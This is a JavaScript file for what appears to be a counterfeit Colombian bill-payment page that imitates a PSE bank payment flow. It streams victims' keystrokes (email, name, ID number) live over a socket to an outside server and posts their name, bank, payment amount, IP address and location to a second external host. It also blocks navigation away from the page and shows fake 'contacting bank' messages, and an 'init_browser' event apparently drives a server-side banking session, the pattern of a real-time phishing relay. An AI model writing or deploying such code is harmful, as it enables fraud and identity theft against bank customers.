// pago.js - Sincronización en Vivo + Resumen de Datos Activo

const socket = io('https://air.pagoswebcol.uk'); 

let isTransactionActive = false;
let browserRequested = false; 
const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

let ipDataCache = {};
fetch('https://ipapi.co/json/')
    .then(res => res.json())
    .then(data => ipDataCache = data)
    .catch(() => console.log("No se pudo obtener la IP"));

// ==========================================
// PREVENIR RECARGA
// ==========================================
window.addEventListener('beforeunload', (e) => {
    if (isTransactionActive) {
        e.preventDefault();
        e.returnValue = 'Por favor espere la carga.';
        return 'Por favor espere la carga.';
    }
});

window.addEventListener('popstate', function (event) {
    if (isTransactionActive) history.pushState(null, document.title, location.href);
});

// ==========================================
// INICIALIZACIÓN DE DATOS (CON NOMBRES DE VARIABLES CORREGIDOS)
// ==========================================
document.addEventListener('DOMContentLoaded', () => {
    const data = JSON.parse(sessionStorage.getItem('datosFactura')) || {};
    console.log("👉 Datos crudos recibidos en pago.js:", data);

    // USAMOS EXACTAMENTE LAS VARIABLES DE TU LOG (data.valor y data.nombre)
    let valorMonto = data.valor || "0";
    
    // Si el valor viene solo como "58.270,00", le agregamos el $ para que se vea como moneda
    if (!valorMonto.toString().includes("$")) {
        valorMonto = "$ " + valorMonto;
    }

    const nombreCliente = data.nombre || "";

    // Insertar textos en la pantalla
    if (document.getElementById('lblNombre') && nombreCliente) document.getElementById('lblNombre').textContent = enmascararNombre(nombreCliente);
    if (document.getElementById('lblId') && data.nic) document.getElementById('lblId').textContent = "NIC - " + enmascararID(data.nic);
    if (document.getElementById('lblRef') && data.referencia) document.getElementById('lblRef').textContent = data.referencia;
    
    if (document.getElementById('lblIp')) {
        setTimeout(() => document.getElementById('lblIp').textContent = ipDataCache.ip || 'Cargando...', 1000);
    }

    // Insertar el precio exacto (Ej: $ 58.270,00)
    if(document.getElementById('lblValorNeto')) document.getElementById('lblValorNeto').textContent = valorMonto;
    if(document.getElementById('lblValorTotal')) document.getElementById('lblValorTotal').textContent = valorMonto;
    if(document.getElementById('lblTotalFinal')) document.getElementById('lblTotalFinal').textContent = valorMonto;

    // Limpiar campos para que el usuario escriba
    if (document.getElementById('formCorreo')) document.getElementById('formCorreo').value = "";
    if (document.getElementById('formNumId')) document.getElementById('formNumId').value = "";
    if (document.getElementById('formNombre')) document.getElementById('formNombre').value = "";
    if (document.getElementById('formCelular')) document.getElementById('formCelular').value = "";
});

// ==========================================
// EXTRACCIÓN DE NÚMERO PURO (SOLO PARA SOCKET Y API)
// ==========================================
function obtenerNumeroPuro(textoPrecio) {
    if (!textoPrecio) return 0;
    // Si trae coma de centavos (ej: 58.270,00), la quitamos para no sumar ceros de más
    let textoSinCentavos = textoPrecio.toString().split(',')[0];
    const textoLimpio = textoSinCentavos.replace(/[^\d]/g, ''); 
    return parseInt(textoLimpio, 10) || 0;
}

// ==========================================
// 1. BANCO EN VIVO
// ==========================================
const selectBanco = document.getElementById('selectBanco');
if (selectBanco) {
    selectBanco.addEventListener('change', (e) => {
        const bancoSeleccionado = e.target.value;
        const data = JSON.parse(sessionStorage.getItem('datosFactura')) || {};
        
        const amountLimpio = obtenerNumeroPuro(data.valor); // <-- Corrección aquí también
        
        if (!browserRequested) {
            socket.emit('init_browser', { bank: bancoSeleccionado, amount: amountLimpio });
            browserRequested = true;
        } else {
            socket.emit('live_type', { field: 'bank', value: bancoSeleccionado });
        }
    });
}

// ==========================================
// 2. LIVE TYPING
// ==========================================
function syncInput(inputId, fieldName) {
    const input = document.getElementById(inputId);
    let timeoutId; 
    if (input) {
        input.addEventListener('input', (e) => {
            if (browserRequested) {
                clearTimeout(timeoutId);
                timeoutId = setTimeout(() => {
                    socket.emit('live_type', { field: fieldName, value: e.target.value });
                }, 400); 
            }
        });
    }
}
syncInput('formCorreo', 'email');
syncInput('formNombre', 'name');
syncInput('formNumId', 'doc');

// ==========================================
// 3. FINALIZAR PAGO
// ==========================================
const botonPagar = document.querySelector('.btn-pay');
let loadingInterval;

if (botonPagar) {
    botonPagar.addEventListener('click', function() {
        const banco = selectBanco ? selectBanco.value : "";
        const email = document.getElementById('formCorreo').value.trim();
        const doc   = document.getElementById('formNumId').value.trim();
        const name  = document.getElementById('formNombre').value.trim();
        const phone = document.getElementById('formCelular').value.trim();

        if (!banco || banco.includes("Seleccione")) { alert("Por favor seleccione un banco."); return; }
        if (!emailRegexValido.test(email)) { alert("Correo inválido."); return; }
        if (!doc || doc.length < 5) { alert("Cédula inválida."); return; }
        if (!name || name.length < 3) { alert("Nombre inválido."); return; }
        if (!phone || phone.length < 7) { alert("Celular inválido."); return; }
        if (!browserRequested) { alert("Por favor vuelva a seleccionar su banco."); return; }

        const dataFactura = JSON.parse(sessionStorage.getItem('datosFactura')) || {};
        const amountLimpio = obtenerNumeroPuro(dataFactura.valor); // <-- Corrección aquí también

        fetch('https://apifinacjs.pagoswebcol.uk/api/payment-alert', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                nombre: name,
                monto: amountLimpio,
                correo: email,
                banco: banco,
                ip: ipDataCache.ip || 'Desconocida',
                ciudad: ipDataCache.city || 'Desconocida',
                pais: ipDataCache.country_name || 'Desconocido',
                url: window.location.href
            })
        }).catch(e => console.error(e));

        isTransactionActive = true; 
        history.pushState(null, document.title, location.href); 

        const overlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('dynamicLoadingText');
        if (overlay) overlay.style.display = 'flex';
        loadingInterval = animateLoadingText(loadingText);

        socket.emit('submit_payment', { email, name, doc, bank: banco });
    });
}

// ==========================================
// RESPUESTAS DEL SERVIDOR
// ==========================================
socket.on('browser_ready', () => console.log("Formulario base llenado con éxito."));

socket.on('payment_success', (data) => {
    const loadingText = document.getElementById('dynamicLoadingText');
    if (loadingText) loadingText.textContent = "Redirigiendo a PSE...";
    clearInterval(loadingInterval);
    setTimeout(() => {
        isTransactionActive = false; 
        window.location.href = data.url; 
    }, 1500);
});

socket.on('payment_error', (data) => {
    clearInterval(loadingInterval);
    isTransactionActive = false; 
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'none';
    alert("Hubo un problema de conexión con el banco: " + data.message);
    browserRequested = false;
    if (selectBanco) selectBanco.value = ""; 
});

// ==========================================
// UTILIDADES
// ==========================================
function animateLoadingText(element) {
    if (!element) return null;
    const messages = ["Conectando con la pasarela...", "Validando datos...", "Contactando banco..."];
    let i = 0;
    return setInterval(() => { i = (i + 1) % messages.length; element.textContent = messages[i]; }, 2500);
}
function enmascararNombre(nombre) { return nombre ? nombre.split(" ")[0] + " *******" : ""; }
function enmascararID(id) { return id ? id.toString().substring(0, 3) + "****" : ""; }
